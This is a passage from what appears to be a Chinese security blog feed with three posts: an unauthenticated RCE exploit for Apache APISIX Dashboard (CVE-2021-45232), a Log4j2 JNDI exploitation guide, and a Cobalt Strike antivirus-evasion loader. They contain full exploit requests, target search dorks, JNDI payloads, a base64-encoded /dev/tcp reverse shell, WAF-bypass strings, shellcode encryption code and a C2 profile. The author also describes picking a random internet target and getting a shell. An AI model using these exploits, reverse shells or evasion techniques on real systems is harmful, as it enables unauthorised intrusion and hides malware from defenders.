    <content type="html"><![CDATA[<blockquote><p>CVE-2021-45232  Apache apisix Dashboard api unauth rce Version: &lt; 2.10.1</p><p>Fofa: title=“Apache APISIX Dashboard”</p><p>Poc: url+/apisix/admin/migrate/export</p><p>Exp: url+/apisix/admin/migrate/import</p></blockquote><h3 id="0x01-检索">0x01 检索</h3><p>Fofa：<code>title=&quot;Apache APISIX Dashboard&quot;</code></p><p>ZoomEye：<code>title:&quot;Apache APISIX Dashboard&quot;</code></p><p>Shodan：<code>http.title:&quot;Apache APISIX Dashboard&quot;</code></p><p><img src="https://s1.ax1x.com/2022/05/23/XpDMx1.png" alt=""></p><h3 id="0x02-检测">0x02 检测</h3><p>能访问 <a href="http://x.x.x:9000/apisix/admin/migrate/export">http://x.x.x:9000/apisix/admin/migrate/export</a> 则说明存在未授权访问配置文件，大概率可进行rce。</p><p><img src="https://s1.ax1x.com/2023/06/24/pCtB8UO.png" alt="图来自o2oxy.cn"></p><h3 id="0x03-利用">0x03 利用</h3><p>向 /apisix/admin/migrate/import 构造数据包提交，添加路由：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">POST /apisix/admin/migrate/import HTTP/1.1<br>Host: x.x.x.x:9000<br>User-Agent: python-requests/2.25.1<br>Accept-Encoding: gzip, deflate<br>Accept: */*<br>Connection: close<br>Content-Length: 666<br>Content-Type: multipart/form-data; boundary=f82165b5e633b8e3fba86bbf468e1546<br><br>--f82165b5e633b8e3fba86bbf468e1546<br>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;data&quot;<br>Content-Type: text/data<br><br>&#123;&quot;Counsumers&quot;: [], &quot;Routes&quot;: [&#123;&quot;id&quot;: &quot;673366244208765680&quot;, &quot;create_time&quot;: 1640674554, &quot;update_time&quot;: 1640677637, &quot;uris&quot;: [&quot;/QeMpHt&quot;], &quot;name&quot;: &quot;QeMpHt&quot;, &quot;methods&quot;: [&quot;GET&quot;, &quot;POST&quot;], &quot;script&quot;: &quot;local file=io.popen(ngx.req.get_headers()[&#x27;cmd&#x27;],&#x27;r&#x27;) \n local output=file:read(&#x27;*all&#x27;) \n file:close() \n ngx.say(output)&quot;, &quot;status&quot;: 1&#125;], &quot;Services&quot;: [], &quot;SSLs&quot;: [], &quot;Upstreams&quot;: [], &quot;Scripts&quot;: [], &quot;GlobalPlugins&quot;: [], &quot;PluginConfigs&quot;: []&#125;xxxx #这里有不可见字符<br>--f82165b5e633b8e3fba86bbf468e1546--<br><br></code></pre></td></tr></table></figure><p>curl 请求 apisix 管理端口9080+ <code>uris</code>中的 <code>/QeMpHt</code>, 即：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://x.x.x.x:9080/QeMpHt -H <span class="hljs-string">&quot;cmd: ifconfig&quot;</span> <br></code></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2022/05/23/XpDnPJ.png" alt=""></p><p>使用poython提交数据、执行命令。</p><p>py脚本: <a href="https://github.com/Kuibagit/CVE-2021-45232-RCE">GitHub</a></p><p><img src="https://s1.ax1x.com/2022/05/23/XpDK2R.png" alt=""></p><p>Reference</p><p><a href="https://mp.weixin.qq.com/s/Me2bjRtmBQv--Aj9I_2cwg">https://mp.weixin.qq.com/s/Me2bjRtmBQv--Aj9I_2cwg</a></p><p><a href="https://www.o2oxy.cn/3945.html">https://www.o2oxy.cn/3945.html</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vuln</tag>
      
      <tag>CVE-2021-45232</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apache Log4j2 RCE漏洞复现</title>
    <link href="/posts/7b02d9dd.html"/>
    <url>/posts/7b02d9dd.html</url>
    
    <content type="html"><![CDATA[<p>Apache Log4j2某些功能存在递归解析，可直接构造恶意请求，触发远程代码执行漏洞。</p><p>1、版本 Apache Log4j 2.x &lt;= 2.14.1</p><p>2、实际上 新版 Apache Log4j 2.x &lt; 2.15.0-rc2，2.15.0-rc1存在绕过？</p><p><a href="https://mp.weixin.qq.com/s/AuBchaUvFw2pisVw6rNX5A">https://mp.weixin.qq.com/s/AuBchaUvFw2pisVw6rNX5A</a></p><p>需要目标可出网。如果使用JNDI注入的形式，需要确认jdk版本。jdk11.0.1 8u191 7u201 6u211或更高版本，默认禁用JNDI注入。</p><h3 id="本地复现">本地复现</h3><p>使用idea新建Maven项目:Log4j2_3201</p><p>pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--pom.xml--&gt;</span><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.sec<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Log4j2_3201<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.14.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>pom<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.14.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.14.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><p>HelloSlf4j.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// HelloSlf4j.java</span><br><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloSlf4j</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">LOGGER</span> <span class="hljs-operator">=</span> LogManager.getLogger(HelloSlf4j.class);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Log4j2 RCE 2.0~2.14.1&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;Version: 2.14.0&quot;</span>);<br>            LOGGER.error(<span class="hljs-string">&quot;$&#123;jndi:ldap://local.xxxxx.dns.1433.eu.org/sec&#125;&quot;</span>);<br>        &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>重新加载i项目/生成源代码并更新文件，运行：calc</p><p><img src="https://s1.ax1x.com/2021/12/10/ooEx9H.png" alt=""></p><p>高版本jdk需要开启 jndi</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">......<br>System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>);<br>......<br></code></pre></td></tr></table></figure><h3 id="Online">Online</h3><p>验证出网 ，盲打。</p><p><code>$&#123;jndi:ldap://xxx.dnslog.cn/sec&#125;</code> 扔baidu、360等直接搜索。</p><p><img src="https://s1.ax1x.com/2021/12/10/ooEOAO.png" alt=""></p><h3 id="Online-getshell">Online getshell</h3><p>利用 JNDIExploit TomcatBypass 链</p><p><code>ldap://127.0.0.1:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd]</code></p><p>起JNDI服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 8.8.8.8 -l 8080 -p 8081<br></code></pre></td></tr></table></figure><p>sh -i &gt;&amp; /dev/tcp/8.8.8.8/21 0&gt;&amp;1  —&gt; c2ggLWkgPiYgL2Rldi90Y3AvOC44LjguOC8yMSAwPiYx</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">$<span class="hljs-punctuation">&#123;</span>jndi<span class="hljs-punctuation">:</span>ldap<span class="hljs-punctuation">:</span><span class="hljs-comment">//8.8.8:8080/TomcatBypass/Command/Base64/c2ggLWkgPiYgL2Rldi90Y3AvOC44LjguOC8yMSAwPiYx&#125;</span><br></code></pre></td></tr></table></figure><p>Google随机找个target</p><p><img src="https://s1.ax1x.com/2021/12/10/ooEqHK.png" alt=""></p><p>got shell</p><p><img src="https://s1.ax1x.com/2021/12/10/ooEj4e.png" alt=""></p><p>Bypass WAF？来源网上，没试过，不知可行否。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">logger.error(<span class="hljs-string">&quot;$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-l&#125;$&#123;::-d&#125;$&#123;::-a&#125;$&#123;::-p&#125;://127.0.0.1:1389/e0mlja&#125;&quot;</span>);<br><br><span class="hljs-string">&quot;$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-l&#125;$&#123;::-d&#125;$&#123;::-a&#125;$&#123;::-p&#125;://ｄｎｓｌｏｇ．ｃｎ/&#125;&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>log4j2</tag>
      
      <tag>CVE-2021-44228</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bypass AV 内存查杀</title>
    <link href="/posts/7954ef6a.html"/>
    <url>/posts/7954ef6a.html</url>
    
    <content type="html"><![CDATA[<p>原文 WBG大佬的：<a href="https://xz.aliyun.com/t/9399">cs bypass卡巴斯基内存查杀 2</a></p><blockquote><p>我们知道内存扫描是耗时耗力不管是卡巴还是其他杀软，一般来说都是扫描进程中一些高危的区域比如带有可执行属性的内存区域，既然他扫描带有X（可执行）属性的内存区域那么只要我们去除X属性，那自然就不会被扫也就不会被发现，但问题是去除X属性后Beacon也就跑不起来，但是不用怕我们知道Windows进程触发异常时我们可以对它处理，而此时我们可以在一瞬间恢复内存X属性让它跑起来然后等它再次进入sleep时去除X属性隐藏起来。</p></blockquote><p>概括</p><blockquote><p>就是将shellcode的内存属性设置为不可执行，当代码执行到这里会触发异常，这时候，之前创建的veh捕捉到异常–进入到异常处理的函数，函数中修改shellcode为可执行，再执行shellcode，执行完后继续将shellcode内存区域设置为不可执行。</p></blockquote><p>也就是通过手动创建bug来bypass。WBG大佬4月发的文章，时间蛮久了，直接拿来用估计不行，稍做修改。读bin文件操作改为直接赋值并加入经过rc4加密 (<a href="https://github.com/bats3c/DefensiveInjector/blob/master/main.c#L124-L183">https://github.com/bats3c/DefensiveInjector/blob/master/main.c#L124-L183</a>)。</p><p>Visual Studio 新建空项目，把WBG大佬给出的demo导入，加入以下代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">DecryptShellcode</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    BOOL bSuccess = TRUE;<br><br>    HCRYPTKEY hCryptoKey;<br>    HCRYPTHASH hCryptHash;<br>    HCRYPTPROV hCryptoProv;<br><br>    <span class="hljs-comment">//自定义key</span><br>    BYTE* pbKey = <span class="hljs-string">&quot;HideMyShellzPlz?&quot;</span>;<br>    DWORD dwLen = <span class="hljs-built_in">strlen</span>(pbKey);<br><br>    <span class="hljs-comment">// get the crypto context</span><br>    bSuccess = <span class="hljs-built_in">fnCryptAcquireContextW</span>(&amp;hCryptoProv, <span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;Microsoft Enhanced RSA and AES Cryptographic Provider&quot;</span>, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);<br>    <span class="hljs-keyword">if</span> (!bSuccess)<br>    &#123;<br>        <span class="hljs-comment">//printf(&quot;CryptAcquireContextW\n&quot;);</span><br>        <span class="hljs-keyword">goto</span> CLEANUP;<br>    &#125;<br><br>    <span class="hljs-comment">// init an create the hashing handle</span><br>    bSuccess = <span class="hljs-built_in">fnCryptCreateHash</span>(hCryptoProv, CALG_SHA_256, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;hCryptHash);<br>    <span class="hljs-keyword">if</span> (!bSuccess)<br>    &#123;<br>        <span class="hljs-comment">//printf(&quot;CryptCreateHash\n&quot;);</span><br>        <span class="hljs-keyword">goto</span> CLEANUP;<br>    &#125;<br><br>    <span class="hljs-comment">// add the key to the hash object</span><br>    bSuccess = <span class="hljs-built_in">fnCryptHashData</span>(hCryptHash, pbKey, dwLen, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!bSuccess)<br>    &#123;<br>        <span class="hljs-comment">//printf(&quot;CryptHashData\n&quot;);</span><br>        <span class="hljs-keyword">goto</span> CLEANUP;<br>    &#125;<br><br>    <span class="hljs-comment">// gen the session keys from the hash</span><br>    bSuccess = <span class="hljs-built_in">fnCryptDeriveKey</span>(hCryptoProv, CALG_RC4, hCryptHash, <span class="hljs-number">0</span>,&amp;hCryptoKey);<br>    <span class="hljs-keyword">if</span> (!bSuccess)<br>    &#123;<br>        <span class="hljs-comment">//printf(&quot;CryptDeriveKey\n&quot;);</span><br>        <span class="hljs-keyword">goto</span> CLEANUP;<br>    &#125;<br><br>    <span class="hljs-comment">// decrypt the buffer</span><br>    bSuccess = <span class="hljs-built_in">fnCryptDecrypt</span>(hCryptoKey, <span class="hljs-literal">NULL</span>, FALSE, <span class="hljs-number">0</span>, (BYTE*)encmeter_bin, &amp;encmeter_bin_len);<br>    <span class="hljs-keyword">if</span> (!bSuccess)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;CryptDecrypt: %d\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">goto</span> CLEANUP;<br>    &#125;<br><br>    <span class="hljs-keyword">goto</span> CLEANUP;<br><br>    CLEANUP:<br>        <span class="hljs-built_in">fnCryptReleaseContext</span>(hCryptoProv, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">fnCryptDestroyKey</span>(hCryptoKey);<br>        <span class="hljs-built_in">fnCryptDestroyHash</span>(hCryptHash);<br><br>        <span class="hljs-keyword">return</span> bSuccess;<br>&#125;<br></code></pre></td></tr></table></figure><p>main</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++">.......<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,  <span class="hljs-type">char</span> <span class="hljs-type">const</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// decrypt the shellcode</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">DecryptShellcode</span>())<br>    &#123;<br>        <span class="hljs-comment">//printf(&quot;[!] Failed to decrypt shellcode\n&quot;);</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>.......<br>&#125;<br></code></pre></td></tr></table></figure><p>需要引入detours库</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./include/detours.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./include/detver.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib,<span class="hljs-string">&quot;./lib.x64/detours.lib&quot;</span>)</span><br><br></code></pre></td></tr></table></figure><p>CS生成raw类型payload，通过opensll进行加密（定义的key需要跟代码中的一致）、xxd转换。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> meter.bin | openssl enc -rc4 -nosalt -k <span class="hljs-string">&quot;HideMyShellzPlz?&quot;</span> &gt; encmeter.bin<br>xxd -i encmeter.bin &gt; encmeter.txt <br></code></pre></td></tr></table></figure><p>把转换后的encmeter.txt内容放进带代码中，编译生成。详情见 <a href="https://www.bilibili.com/video/BV1yT4y1Z7HW">https://www.bilibili.com/video/BV1yT4y1Z7HW</a></p><p><img src="https://z3.ax1x.com/2021/12/03/oULSeg.png" alt=""></p><p>效果：</p><p>Defender、某绒、某数字无感知直接上线并执行命令。据说国内杀软都可以过，这个没去一个个试就不清楚了。</p><p><img src="https://z3.ax1x.com/2021/12/03/oULPFs.png" alt=""></p><p>卡巴，不出意外，上线后瞬间就被干掉了…</p><p><img src="https://z3.ax1x.com/2021/12/03/oULpwQ.png" alt=""></p><p>CS加上C2配置</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># default sleep time is 60s</span><br><span class="hljs-string">set</span> <span class="hljs-string">sleeptime</span> <span class="hljs-string">&quot;60000&quot;</span><span class="hljs-string">;</span><br><br><span class="hljs-comment"># jitter factor 0-99% [randomize callback times]</span><br><span class="hljs-string">set</span> <span class="hljs-string">jitter</span>    <span class="hljs-string">&quot;0&quot;</span><span class="hljs-string">;</span><br><br><span class="hljs-comment"># maximum number of bytes to send in a DNS A record request</span><br><span class="hljs-string">set</span> <span class="hljs-string">maxdns</span>    <span class="hljs-string">&quot;255&quot;</span><span class="hljs-string">;</span><br><br><span class="hljs-comment"># indicate that this is the default Beacon profile</span><br><span class="hljs-string">set</span> <span class="hljs-string">sample_name</span> <span class="hljs-string">&quot;360&quot;</span><span class="hljs-string">;</span><br><br><span class="hljs-comment"># define indicators for an HTTP GET</span><br><span class="hljs-string">http-get</span> &#123;<br>    <span class="hljs-comment"># Beacon will randomly choose from this pool of URIs</span><br>    <span class="hljs-string">set</span> <span class="hljs-string">uri</span> <span class="hljs-string">&quot;/test&quot;</span><span class="hljs-string">;</span><br><br>    <span class="hljs-string">client</span> &#123;<br>        <span class="hljs-comment"># base64 encode session metadata and store it in the Cookie header.</span><br>        <span class="hljs-string">metadata</span> &#123;<br>            <span class="hljs-string">base64;</span><br>            <span class="hljs-string">header</span> <span class="hljs-string">&quot;Cookie&quot;</span><span class="hljs-string">;</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-string">server</span> &#123;<br>        <span class="hljs-comment"># server should send output with no changes</span><br>        <span class="hljs-string">header</span> <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;application/octet-stream&quot;</span><span class="hljs-string">;</span><br><br>        <span class="hljs-string">output</span> &#123;<br>            <span class="hljs-string">print;</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment"># define indicators for an HTTP POST</span><br><span class="hljs-string">http-post</span> &#123;<br><br>    <span class="hljs-string">set</span> <span class="hljs-string">uri</span> <span class="hljs-string">&quot;/test.php&quot;</span><span class="hljs-string">;</span><br><br>    <span class="hljs-string">client</span> &#123;<br>        <span class="hljs-string">header</span> <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;application/octet-stream&quot;</span><span class="hljs-string">;</span><br><br>        <span class="hljs-comment"># transmit our session identifier as /submit.php?id=[identifier]</span><br>        <span class="hljs-string">id</span> &#123;<br>            <span class="hljs-string">parameter</span> <span class="hljs-string">&quot;id&quot;</span><span class="hljs-string">;</span><br>        &#125;<br><br>        <span class="hljs-comment"># post our output with no real changes</span><br>        <span class="hljs-string">output</span> &#123;<br>            <span class="hljs-string">print;</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment"># The server&#x27;s response to our HTTP POST</span><br>    <span class="hljs-string">server</span> &#123;<br>        <span class="hljs-string">header</span> <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;text/html&quot;</span><span class="hljs-string">;</span><br><br>        <span class="hljs-comment"># this will just print an empty string, meh...</span><br>        <span class="hljs-string">output</span> &#123;<br>            <span class="hljs-string">print;</span><br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后简单改改特征，如增加资源图标、属性信息之类。</p><p><img src="https://z3.ax1x.com/2021/12/03/oUL9oj.png" alt=""></p><p>tasklist /svc</p><p><img src="https://z3.ax1x.com/2021/12/03/oUqxOS.png" alt=""></p><p><strong>Reference</strong></p><p><a href="https://xz.aliyun.com/t/9399">https://xz.aliyun.com/t/9399</a></p><p><a href="https://github.com/bats3c/DefensiveInjector">https://github.com/bats3c/DefensiveInjector</a></p><p><a href="https://www.bilibili.com/video/BV1yT4y1Z7HW">https://www.bilibili.com/video/BV1yT4y1Z7HW</a></p><p><a href="https://blog.csdn.net/qing666888/article/details/81540683">https://blog.csdn.net/qing666888/article/details/81540683</a></p><p><a href="https://hjw322.top/win32-trap/">https://hjw322.top/win32-trap/</a></p><p><a href="https://blog.csdn.net/qq_45490578/article/details/118991882">https://blog.csdn.net/qq_45490578/article/details/118991882</a></p><p><a 